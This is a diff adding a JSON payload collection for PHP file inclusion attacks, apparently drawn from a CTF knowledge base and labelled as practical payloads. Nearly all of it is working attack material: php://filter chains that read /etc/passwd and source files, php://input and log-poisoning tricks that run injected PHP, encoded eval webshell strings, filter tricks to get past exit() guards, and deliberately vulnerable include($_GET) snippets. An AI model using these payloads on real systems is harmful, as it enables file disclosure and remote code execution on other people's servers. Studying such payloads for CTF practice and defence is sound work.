@@ -1,0 +1,98 @@
+{
+  "id": "payload-file_inclusion-001",
+  "type": "payload",
+  "category": "file_ops",
+  "subcategory": "file_inclusion",
+  "name": "文件包含 Payload 集合",
+  "description": "从 文件包含.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "include()\r\ninclude_once()\r\nrequire()\r\nrequire_once()",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "/proc/self/environ\r\n/proc/self/fd/1,2,3,4...\r\n# ssh日志，攻击方法：\r\n# ssh `<?php phpinfo(); ?>`@192.168.1.1\r\n/var/log/auth.log\r\n# apache日志\r\n/var/log/apache2/[access.log|error.log]",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<form action=\"http://127.0.0.1/1.php\" method=\"POST\" enctype=\"multipart/form-data\">\r\n <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"<?php phpinfo(); ?>\" />\r\n <input type=\"file\" name=\"file\" />\r\n <input type=\"submit\" />\r\n</form>",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "1. 7.0.0 <= PHP Version < 7.0.28\r\nphp://filter/string.strip_tags/resource=/etc/passwd\r\n\r\n2. php7 老版本通杀\r\nphp://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\nshow_source($_GET['yunen']); # 有回显\r\nfile_get_contents($_GET['yunen']); # 无回显\r\necho file_get_contents($_GET['yunen']); # 有回显\r\n?>\r\n# show_source相当于自带输出功能，而file_get_contents并没有。",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\ninclude($_GET['file']);\r\n# ?file=php://filter/read=convert.base64-encode/resource=flag.php",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\necho file_get_contents($_GET['yunen']);\r\n?>",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\ninclude($_GET['f']);\r\n?>\r\n\r\n#URL: /lfi.php?f=php://input\r\n#POST DATA: <?php phpinfo();?>",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名）\r\n# 过滤|的情况下，使用多过滤器：\r\nphp://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\n$filename=$_GET['filename'];\r\n$content=$filename;\r\nfile_put_contents($filename,'<php exit()?>'.$content);\r\n?>",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "<?php\r\n$fp = fopen('php://output', 'w');\r\nstream_filter_append($fp, 'convert.quoted-printable-decode');\r\nfwrite($fp, \"/resource=aaaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4\");\r\n/* Outputs:  /resourceªaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4  */\r\n?>",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "php://filter/PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=yunen.php",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp pe@av(l_$OPTSs[m1lp]e;)>?/resource=s1mple.php;",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@%20p(lavOP_$s[TS]pm1>?;)/resource=s1mple.php",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    },
+    {
+      "payload": "php://filter/string.strip_tags/resource=?>/../yunen.php",
+      "context": "文件包含",
+      "source": "文件包含.md"
+    }
+  ],
+  "related_theory": [
+    "theory-file-inclusion-001"
+  ],
+  "related_pocs": [],
+  "tags": [
+    "文件包含",
+    "LFI",
+    "RFI",
+    "file_ops"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/文件包含.md",
+  "last_updated": "2026-10-22"
+}
